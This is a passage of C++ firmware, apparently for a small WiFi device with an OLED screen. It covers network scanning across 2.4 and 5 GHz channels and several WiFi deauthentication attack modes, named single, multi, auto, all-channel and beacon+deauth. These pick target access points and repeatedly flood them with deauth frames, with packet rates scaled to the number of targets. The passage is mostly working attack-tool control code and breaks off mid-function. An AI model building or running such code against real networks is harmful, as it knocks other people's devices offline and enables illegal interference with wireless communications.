            if(scrollPosition >= (int)ssid.length()) {
              scrollPosition = 0;
            }
            lastScrollTime = currentTime;
          }
          String scrolledText = ssid.substring(scrollPosition) + ssid.substring(0, scrollPosition);
          ssid = scrolledText.substring(0, containsChinese(ssid) ? 26 : 18);
        }
      }                                                            
      
      // 
      {
        // ：
        if(isHighlighted) {
          int rectY = i * ITEM_HEIGHT - 1 + Y_OFFSET;
          display.drawRoundRect(0, rectY, display.width(), ITEM_HEIGHT + 2, 2, SSD1306_WHITE);
          display.drawRoundRect(1, rectY+1, display.width()-2, ITEM_HEIGHT-0, 2, SSD1306_WHITE); // 
        }

        // ："[*]", highlight only">", 
        bool isSelected = isIndexSelected(wifiIndex);
        bool showIndicator = isSelected || (isHighlighted && !isSelected);
        if (showIndicator) {
          display.setCursor(3, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
          display.setTextColor(SSD1306_WHITE);
          if (isSelected) {
            display.print("[*]");
          } else {
            display.print('>');
          }
        }

        {
          int textX = TEXT_LEFT + (isSelected ? STAR_GAP : (showIndicator ? ARROW_GAP : 0));
          int maxW = SSID_RIGHT_LIMIT_X - textX;
          String renderText = ssid;
          if (isHighlighted) {
            int textW = u8g2_for_adafruit_gfx.getUTF8Width(renderText.c_str());
            if (textW > maxW) {
              if (currentTime - lastScrollTime >= SCROLL_DELAY) {
                scrollPosition = advanceUtf8Index(renderText, scrollPosition);
                if (scrollPosition >= (int)renderText.length()) scrollPosition = 0;
                lastScrollTime = currentTime;
              }
              String rotated = renderText.substring(scrollPosition) + renderText.substring(0, scrollPosition);
              renderText = utf8ClipToWidthNoEllipsis(rotated, maxW);
            } else {
              renderText = utf8ClipToWidthNoEllipsis(renderText, maxW);
            }
          } else {
            renderText = utf8TruncateToWidth(renderText, maxW);
          }

          if(containsChinese(ssid)) {
            u8g2_for_adafruit_gfx.setFontMode(1);
            u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
            int textY = i * ITEM_HEIGHT + BASELINE_CHINESE_OFFSET + Y_OFFSET + (isHighlighted ? 1 : 0);
            u8g2_for_adafruit_gfx.setCursor(textX, textY);
            u8g2_for_adafruit_gfx.print(renderText);
          } else {
            display.setCursor(textX, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
            display.setTextColor(SSD1306_WHITE);
            display.print(renderText);
          }
        }
      }
      
      // 
      display.setTextColor(SSD1306_WHITE);
      display.setCursor(110, i * ITEM_HEIGHT + BASELINE_ASCII_OFFSET + Y_OFFSET);
      display.print(scan_results[wifiIndex].channel >= 36 ? "5G" : "24");
      
      display.setTextColor(SSD1306_WHITE);
    }
    
    // 
    display.display();
  }
}
void drawscan() {
  Serial.println("=== Start WiFi Scan ===");
  const unsigned long SCAN_TIMEOUT_MS = 2500;
  performScanWithUI("Scanning...", SCAN_TIMEOUT_MS, -1);
}

// ：SSID
void drawDeepScan() {
  Serial.println("=== Start Deep Scan ===");
  performAdvancedDeepScan();
}

// ：
void performAdvancedDeepScan() {
  while (true) {
    display.clearDisplay();
    display.setTextColor(SSD1306_WHITE);
    display.setTextSize(1);

    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    int titleW = u8g2_for_adafruit_gfx.getUTF8Width("Deep scanning...");
    int titleX = (display.width() - titleW) / 2;
    u8g2_for_adafruit_gfx.setCursor(titleX, 24);
    u8g2_for_adafruit_gfx.print("Deep scanning...");
    display.display();

    // 
    scan_results.clear();
    SelectedVector.clear();
    g_scanDone = false;
    
    // ，
    std::set<String> uniqueSSIDs;
    std::vector<WiFiScanResult> allResults;
    
    // 1：（）
    Serial.println("=== Strategy1: Standard ===");
    updateScanProgress(1, 3, "Standard Scan");
    performSingleScan("Standard Scan", 4000, allResults, uniqueSSIDs);
    
    // 2：（2.4G + 5G）
    Serial.println("=== Strategy2: Multi-band ===");
    updateScanProgress(2, 3, "Multi-band Scan");
    performChannelWiseScan(allResults, uniqueSSIDs);
    
    // 3：
    Serial.println("=== Strategy3: Hidden ===");
    updateScanProgress(3, 3, "Hidden Scan");
    performHiddenNetworkScan(allResults, uniqueSSIDs);
    
    // scan_results
    scan_results = allResults;
    
    // ：，
    std::sort(scan_results.begin(), scan_results.end(), 
              [](const WiFiScanResult& a, const WiFiScanResult& b) {
                return a.rssi > b.rssi; // 
              });
    
    // （RSSI < -90dBm）
    scan_results.erase(
      std::remove_if(scan_results.begin(), scan_results.end(),
                    [](const WiFiScanResult& result) {
                      return result.rssi < -90;
                    }),
      scan_results.end());
    
    // 100（50）
    if (scan_results.size() > 100) {
      scan_results.resize(100);
    }
    
    selectedFlags.assign(scan_results.size(), 0);
    
    Serial.println("Deep scan done, found " + String(scan_results.size()) + " networks");
    
    // 
    display.clearDisplay();
    u8g2_for_adafruit_gfx.setFontMode(1);
    u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
    u8g2_for_adafruit_gfx.setCursor(5, 25);
    u8g2_for_adafruit_gfx.print("Done");
    u8g2_for_adafruit_gfx.setCursor(5, 40);
    u8g2_for_adafruit_gfx.print("Found: " + String(scan_results.size()));
    display.display();
    delay(500);
    
    menustate = 0;
    homeState = 0;
    homeStartIndex = 0;
    break;
  }
}

// 
void performSingleScan(const char* scanType, unsigned long timeoutMs, 
                      std::vector<WiFiScanResult>& allResults, 
                      std::set<String>& uniqueSSIDs) {
  updateScanDisplay(scanType);
  
  // scan_results，
  scan_results.clear();
  g_scanDone = false;
  unsigned long startMs = millis();
  
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    while (!g_scanDone && (millis() - startMs) < timeoutMs) {
      delay(10);
    }
    
    // （）
    for (const auto& result : scan_results) {
      if (uniqueSSIDs.find(result.ssid) == uniqueSSIDs.end()) {
        uniqueSSIDs.insert(result.ssid);
        allResults.push_back(result);
      }
    }
  }
}

// 
void performChannelWiseScan(std::vector<WiFiScanResult>& allResults, 
                           std::set<String>& uniqueSSIDs) {
  // 2.4G + 5G
  // 5G：
  // - 36-48: 5.18-5.24 GHz (UNII-1)
  // - 52-64: 5.26-5.32 GHz (UNII-2A) 
  // - 100-140: 5.5-5.7 GHz (UNII-2C)
  // - 149-165: 5.745-5.825 GHz (UNII-3)
  int channels[] = {
    // 2.4G - 
    1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 14, 5, 10,
    // 5G - (5.18-5.24 GHz)
    36, 40, 44, 48,
    // 5G - (5.26-5.32 GHz) 
    52, 56, 60, 64,
    // 5G - (5.5-5.7 GHz)
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    // 5G - (5.745-5.825 GHz)
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(channels) / sizeof(channels[0]);
  
  for (int i = 0; i < numChannels; i++) {
    int channel = channels[i];
    String scanType = "CH" + String(channel);
    updateScanDisplay(scanType.c_str());
    
    // 
    wext_set_channel(WLAN0_NAME, channel);
    delay(150);
    
    // 
    int scanTime;
    if (channel == 1 || channel == 6 || channel == 11) {
      // 2.4G
      scanTime = 3000;
    } else if (channel >= 36 && channel <= 64) {
      // 5G
      scanTime = 2500;
    } else if (channel >= 100 && channel <= 140) {
      // 5G
      scanTime = 2500;
    } else if (channel >= 149 && channel <= 165) {
      // 5G
      scanTime = 2500;
    } else {
      // 2.4G
      scanTime = 2000;
    }
    
    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}


// 
void performHiddenNetworkScan(std::vector<WiFiScanResult>& allResults, 
                            std::set<String>& uniqueSSIDs) {
  // ，
  // 2.4G5G
  int hiddenChannels[] = {
    // 2.4G
    1, 6, 11, 2, 7, 12,
    // 5G
    36, 40, 44, 48, 52, 56, 60, 64,
    100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
    149, 153, 157, 161, 165
  };
  int numChannels = sizeof(hiddenChannels) / sizeof(hiddenChannels[0]);
  
  for (int i = 0; i < numChannels; i++) {
    int channel = hiddenChannels[i];
    String scanType = "Hidden" + String(channel);
    updateScanDisplay(scanType.c_str());
    
    wext_set_channel(WLAN0_NAME, channel);
    delay(200);
    
    // 
    int scanTime = (channel >= 36) ? 2500 : 3000; // 5G，2.4G
    performSingleScan(scanType.c_str(), scanTime, allResults, uniqueSSIDs);
    delay(300);
  }
}

// 
void updateScanProgress(int current, int total, const char* strategy) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  // 
  int titleW = u8g2_for_adafruit_gfx.getUTF8Width("Deep scanning...");
  int titleX = (display.width() - titleW) / 2;
  u8g2_for_adafruit_gfx.setCursor(titleX, 10);
  u8g2_for_adafruit_gfx.print("Deep scanning...");
  
  // 
  String progress = "Progress: " + String(current) + "/" + String(total);
  int progressW = u8g2_for_adafruit_gfx.getUTF8Width(progress.c_str());
  int progressX = (display.width() - progressW) / 2;
  u8g2_for_adafruit_gfx.setCursor(progressX, 25);
  u8g2_for_adafruit_gfx.print(progress);
  
  // 
  int strategyW = u8g2_for_adafruit_gfx.getUTF8Width(strategy);
  int strategyX = (display.width() - strategyW) / 2;
  u8g2_for_adafruit_gfx.setCursor(strategyX, 40);
  u8g2_for_adafruit_gfx.print(strategy);
  
  // 
  int barWidth = 100;
  int barHeight = 4;
  int barX = (display.width() - barWidth) / 2;
  int barY = 50;
  
  // 
  display.drawRect(barX, barY, barWidth, barHeight, SSD1306_WHITE);
  
  // 
  int fillWidth = (barWidth * current) / total;
  display.fillRect(barX, barY, fillWidth, barHeight, SSD1306_WHITE);
  
  display.display();
}

// 
void updateScanDisplay(const char* scanType) {
  display.clearDisplay();
  u8g2_for_adafruit_gfx.setFontMode(1);
  u8g2_for_adafruit_gfx.setForegroundColor(SSD1306_WHITE);
  
  int titleW = u8g2_for_adafruit_gfx.getUTF8Width("Deep scanning...");
  int titleX = (display.width() - titleW) / 2;
  u8g2_for_adafruit_gfx.setCursor(titleX, 15);
  u8g2_for_adafruit_gfx.print("Deep scanning...");
  
  int typeW = u8g2_for_adafruit_gfx.getUTF8Width(scanType);
  int typeX = (display.width() - typeW) / 2;
  u8g2_for_adafruit_gfx.setCursor(typeX, 35);
  u8g2_for_adafruit_gfx.print(scanType);
  
  // 
  static int animFrame = 0;
  const char* frames[4] = {"|", "/", "-", "\\"};
  u8g2_for_adafruit_gfx.setCursor(display.width() - 20, 50);
  u8g2_for_adafruit_gfx.print(frames[animFrame % 4]);
  animFrame++;
  
  display.display();
}
// ============ ============
// - 
void processChannelBuckets() {
  // 
  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
    g_deauthState.currentChannelBucketIndex = 0;
    return;
  }
  
  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
  if (bucket.empty()) {
    g_deauthState.currentChannelBucketIndex++;
    return;
  }
  
  // ，BSSID
  if (g_deauthState.currentBssidIndexInBucket == 0) {
    setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
  }
  
  // BSSID
  if (g_deauthState.currentBssidIndexInBucket < bucket.size()) {
    sendDeauthBatch(bucket[g_deauthState.currentBssidIndexInBucket], 
                    g_deauthState.packetsPerCycle, 
                    g_deauthState.packetCount);
    g_deauthState.currentBssidIndexInBucket++;
  } else {
    // ，
    g_deauthState.currentBssidIndexInBucket = 0;
    g_deauthState.currentChannelBucketIndex++;
  }
}

// - 
void processChannelBucketsEnhanced() {
  // 
  if (g_deauthState.currentChannelBucketIndex >= channelBucketsCache.buckets.size()) {
    // extras
    if (g_deauthState.currentTargetIndex < channelBucketsCache.extras.size()) {
      auto& eb = channelBucketsCache.extras[g_deauthState.currentTargetIndex];
      if (!eb.bssids.empty()) {
        setChannelOptimized(eb.channel);
        for (const uint8_t *bssidPtr : eb.bssids) {
          if (g_enhancedDeauthMode) {
            sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
          } else {
            sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
          }
        }
      }
      g_deauthState.currentTargetIndex++;
    } else {
      // ，
      g_deauthState.currentChannelBucketIndex = 0;
      g_deauthState.currentTargetIndex = 0;
    }
    return;
  }
  
  auto& bucket = channelBucketsCache.buckets[g_deauthState.currentChannelBucketIndex];
  if (bucket.empty()) {
    g_deauthState.currentChannelBucketIndex++;
    return;
  }
  
  // 
  setChannelOptimized(allChannels[g_deauthState.currentChannelBucketIndex]);
  
  // BSSID（）
  for (const uint8_t *bssidPtr : bucket) {
    if (g_enhancedDeauthMode) {
      sendDeauthBatchEnhanced(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
    } else {
      sendDeauthBatch(bssidPtr, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
    }
  }
  
  // 
  g_deauthState.currentChannelBucketIndex++;
}

// 
void startSingleAttack() {
  g_deauthState.mode = ATTACK_SINGLE;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // （）
  if (!SelectedVector.empty()) {
    channelBucketsCache.clearBuckets();
    for (int idx : SelectedVector) {
      if (idx >= 0 && idx < (int)scan_results.size()) {
        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
      }
    }
    g_deauthState.currentChannelBucketIndex = 0;
    g_deauthState.currentBssidIndexInBucket = 0;
    
    // 
    int targetCount = SelectedVector.size();
    if (targetCount > 5) {
      g_deauthState.packetsPerCycle = perdeauth * 2; // 
    } else {
      g_deauthState.packetsPerCycle = perdeauth * 3; // 
    }
  }
  
  Serial.println("=== Start Single Attack ===");
  Serial.println("Enhanced: " + String(g_enhancedDeauthMode ? "On" : "Off"));
  showAttackStatusPage("Single attack...");
  startAttackLED();
}

// 
void processSingleAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Single attack...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Single attack...");
    g_deauthState.lastUIUpdateMs = now;
  }
  
  // （）
  if (SelectedVector.empty()) {
    // 
    setChannelOptimized(scan_results[scrollindex].channel);
    if (g_enhancedDeauthMode) {
      sendDeauthBatchEnhanced(scan_results[scrollindex].bssid, 
                              g_deauthState.packetsPerCycle, 
                              g_deauthState.packetCount);
    } else {
      sendDeauthBatch(scan_results[scrollindex].bssid, 
                      g_deauthState.packetsPerCycle, 
                      g_deauthState.packetCount);
    }
  } else {
    // ：（）
    processChannelBucketsEnhanced();
  }
  
  // LED
  if (g_deauthState.packetCount >= 1000) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// ：
void Single() {
  startSingleAttack();
  // 
  while (g_deauthState.running) {
    processSingleAttack();
  }
}

// 
void startMultiAttack() {
  g_deauthState.mode = ATTACK_MULTI;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // 
  if (!SelectedVector.empty()) {
    channelBucketsCache.clearBuckets();
    for (int idx : SelectedVector) {
      if (idx >= 0 && idx < (int)scan_results.size()) {
        channelBucketsCache.add(scan_results[idx].channel, scan_results[idx].bssid);
      }
    }
    g_deauthState.currentChannelBucketIndex = 0;
    g_deauthState.currentBssidIndexInBucket = 0;
    
    // 
    int targetCount = SelectedVector.size();
    if (targetCount > 5) {
      g_deauthState.packetsPerCycle = perdeauth * 2; // 
    } else {
      g_deauthState.packetsPerCycle = perdeauth * 3; // 
    }
  }
  
  Serial.println("=== Start Multi Attack ===");
  Serial.println("Enhanced: " + String(g_enhancedDeauthMode ? "On" : "Off"));
  showAttackStatusPage("Multi attack...");
  startAttackLED();
}

// 
void processMultiAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Multi attack...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Multi attack...");
    g_deauthState.lastUIUpdateMs = now;
  }
  
  // 
  if (SelectedVector.empty()) {
    return; // ，
  }
  
  // 
  processChannelBucketsEnhanced();
  
  // LED
  if (g_deauthState.packetCount >= 200) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// ：
void Multi() {
  startMultiAttack();
  // 
  while (g_deauthState.running) {
    processMultiAttack();
  }
}
void updateSmartTargets() {
  // 
  std::vector<WiFiScanResult> backup_results = scan_results;
  
  // 
  scan_results.clear();
  
  // 
  for (auto& target : smartTargets) {
    target.active = false;
  }

  // 
  if (scanNetworks() == 0) {  // 
    // 
    for (auto& target : smartTargets) {
      for (const auto& result : scan_results) {
        if (memcmp(target.bssid, result.bssid, 6) == 0) {
          target.active = true;
          target.channel = result.channel;
          break;
        }
      }
    }
  } else {  // 
    // 
    scan_results = std::move(backup_results);
    // 
    for (auto& target : smartTargets) {
      target.active = true;
    }
    Serial.println("Scan failed, restored previous results");
  }
}
// 
void startAutoSingleAttack() {
  g_deauthState.mode = ATTACK_AUTO_SINGLE;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.lastScanMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 3; // 
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 120;
  g_deauthState.ledBlinkInterval = 600;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // 
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    g_deauthState.lastScanMs = millis();
  }
  
  Serial.println("=== Start Auto Single ===");
  showAttackStatusPage("Auto single...");
  startAttackLED();
}

// 
void processAutoSingleAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Auto single...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Auto single...");
    g_deauthState.lastUIUpdateMs = now;
  }
  
  // （10）
  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
    std::vector<WiFiScanResult> backup = scan_results; // 
    updateSmartTargets();
    if (scan_results.empty()) {
      scan_results = std::move(backup); // ，
    }
    g_deauthState.lastScanMs = now;
  }
  
  // 
  if (smartTargets.empty()) {
    return; // ，
  }
  
  for (const auto& target : smartTargets) {
    if (target.active) {  // 
      setChannelOptimized(target.channel);
      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
      
      // LED
      if (g_deauthState.packetCount >= 500) {
        digitalWrite(LED_R, HIGH);
        delay(5); // LED，
        digitalWrite(LED_R, LOW);
        g_deauthState.packetCount = 0;
      }
      break; // 
    }
  }
}

// ：
void AutoSingle() {
  startAutoSingleAttack();
  // 
  while (g_deauthState.running) {
    processAutoSingleAttack();
  }
}
// 
void startAutoMultiAttack() {
  g_deauthState.mode = ATTACK_AUTO_MULTI;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.lastScanMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 5; // 
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 120;
  g_deauthState.ledBlinkInterval = 600;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // 
  if (smartTargets.empty() && !SelectedVector.empty()) {
    for (int selectedIndex : SelectedVector) {
      if (selectedIndex >= 0 && selectedIndex < (int)scan_results.size()) {
        TargetInfo target;
        memcpy(target.bssid, scan_results[selectedIndex].bssid, 6);
        target.channel = scan_results[selectedIndex].channel;
        target.active = true;
        smartTargets.push_back(target);
      }
    }
    g_deauthState.lastScanMs = millis();
  }
  
  Serial.println("=== Start Auto Multi ===");
  showAttackStatusPage("Auto multi...");
  startAttackLED();
}

// 
void processAutoMultiAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Auto multi...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Auto multi...");
    g_deauthState.lastUIUpdateMs = now;
  }
  
  // （10）
  if (now - g_deauthState.lastScanMs >= SCAN_INTERVAL) {
    std::vector<WiFiScanResult> backup = scan_results;
    updateSmartTargets();
    if (scan_results.empty()) {
      scan_results = std::move(backup);
    }
    g_deauthState.lastScanMs = now;
  }
  
  // （）
  if (!smartTargets.empty()) {
    // 
    while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
      g_deauthState.currentTargetIndex++;
    }
    if (g_deauthState.currentTargetIndex >= smartTargets.size()) {
      g_deauthState.currentTargetIndex = 0;
      // 
      while (g_deauthState.currentTargetIndex < smartTargets.size() && !smartTargets[g_deauthState.currentTargetIndex].active) {
        g_deauthState.currentTargetIndex++;
      }
    }
    
    if (g_deauthState.currentTargetIndex < smartTargets.size()) {
      const auto& target = smartTargets[g_deauthState.currentTargetIndex];
      setChannelOptimized(target.channel);
      sendDeauthBatch(target.bssid, g_deauthState.packetsPerCycle, g_deauthState.packetCount);
      
      // LED
      if (g_deauthState.packetCount >= 100) {
        digitalWrite(LED_R, HIGH);
        delay(5); // LED，
        digitalWrite(LED_R, LOW);
        g_deauthState.packetCount = 0;
      }
      g_deauthState.currentTargetIndex = (g_deauthState.currentTargetIndex + 1) % smartTargets.size();
    }
  }
}

// 
void startAllAttack() {
  g_deauthState.mode = ATTACK_ALL;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = perdeauth;
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 500;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  // （）
  if (smartTargets.empty()) {
    for (size_t i = 0; i < scan_results.size(); i++) {
      TargetInfo target;
      memcpy(target.bssid, scan_results[i].bssid, 6);
      target.channel = scan_results[i].channel;
      target.active = true;
      smartTargets.push_back(target);
    }
  }
  
  // 
  channelBucketsCache.clearBuckets();
  for (const auto &t : smartTargets) {
    if (t.active) {
      channelBucketsCache.add(t.channel, t.bssid);
    }
  }
  g_deauthState.currentChannelBucketIndex = 0;
  g_deauthState.currentBssidIndexInBucket = 0;
  
  // 
  int targetCount = smartTargets.size();
  if (targetCount > 10) {
    g_deauthState.packetsPerCycle = perdeauth * 2; // 
  } else {
    g_deauthState.packetsPerCycle = perdeauth * 3; // 
  }
  
  Serial.println("=== Start All-Channel ===");
  Serial.println("Enhanced: " + String(g_enhancedDeauthMode ? "On" : "Off"));
  showAttackStatusPage("All channel...");
  startAttackLED();
}

// 
void processAllAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("All channel...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("All channel...");
    g_deauthState.lastUIUpdateMs = now;
  }
  
  // 
  processChannelBucketsEnhanced();
  
  // LED
  if (g_deauthState.packetCount >= 100) {
    digitalWrite(LED_R, HIGH);
    delay(5); // LED，
    digitalWrite(LED_R, LOW);
    g_deauthState.packetCount = 0;
  }
}

// +
void startBeaconDeauthAttack() {
  g_deauthState.mode = ATTACK_BEACON_DEAUTH;
  g_deauthState.running = true;
  g_deauthState.currentTargetIndex = 0;
  g_deauthState.packetCount = 0;
  g_deauthState.lastPacketMs = 0;
  g_deauthState.lastUIUpdateMs = 0;
  g_deauthState.lastButtonCheckMs = 0;
  g_deauthState.lastLEDToggleMs = 0;
  g_deauthState.ledState = false;
  g_deauthState.packetsPerCycle = 1; // 
  g_deauthState.uiUpdateInterval = 500;
  g_deauthState.buttonCheckInterval = 100;
  g_deauthState.ledBlinkInterval = 800;
  g_deauthState.channelSet = false;
  g_deauthState.lastChannel = -1;
  
  Serial.println("=== Start Beacon+Deauth ===");
  showAttackStatusPage("Beacon+Deauth...");
  startAttackLED();
}

// +
void processBeaconDeauthAttack() {
  unsigned long now = millis();
  
  // LED（）
  if (now - g_deauthState.lastLEDToggleMs >= g_deauthState.ledBlinkInterval) {
    g_deauthState.ledState = !g_deauthState.ledState;
    digitalWrite(LED_R, g_deauthState.ledState ? HIGH : LOW);
    g_deauthState.lastLEDToggleMs = now;
  }
  
  // （）
  if (now - g_deauthState.lastButtonCheckMs >= g_deauthState.buttonCheckInterval) {
    if (digitalRead(BTN_OK) == LOW || digitalRead(BTN_BACK) == LOW) {
      if (showConfirmModal("Stop attack?")) {
        stopAttack();
        return;
      }
      startAttackLED();
      showAttackStatusPage("Beacon+Deauth...");
    }
    g_deauthState.lastButtonCheckMs = now;
  }
  
  // UI（）
  if (now - g_deauthState.lastUIUpdateMs >= g_deauthState.uiUpdateInterval) {
    showAttackStatusPage("Beacon+Deauth...");
